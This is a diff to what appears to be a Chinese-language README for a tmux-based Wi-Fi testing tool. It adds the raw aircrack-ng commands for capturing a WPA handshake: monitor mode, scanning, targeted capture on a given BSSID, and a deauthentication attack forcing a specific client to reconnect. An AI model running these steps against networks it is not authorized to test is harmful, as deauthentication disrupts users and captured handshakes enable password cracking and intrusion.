@@ -24,6 +24,22 @@
    - 使用 `tmux` 管理两个并行的任务：
      - 左窗格：运行数据包捕获任务。
      - 右窗格：用户交互界面，用于选择目标设备并执行网络测试。
+5.**原始命令1**
+   sudo airmon-ng
+
+   # put your network device into monitor mode.wlon0是网卡设备名.
+   sudo airmon-ng start wlan0
+
+   # listen for all nearby beacon frames to get target BSSID and channel
+   sudo airodump-ng wlan0mon
+
+   # start listening for the handshake.-c6指的是信道.--bssid指的是AP.test是文件夹.wlan0mon是网卡设备名
+   sudo airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w test/ wlan0mon
+
+   # optionally deauth a connected client to force a handshake.-a指的是AP.-c指的是Client（STATION）.
+   sudo aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 wlan0mon
+   
+   python -m http.server 1234
 
 ---
 
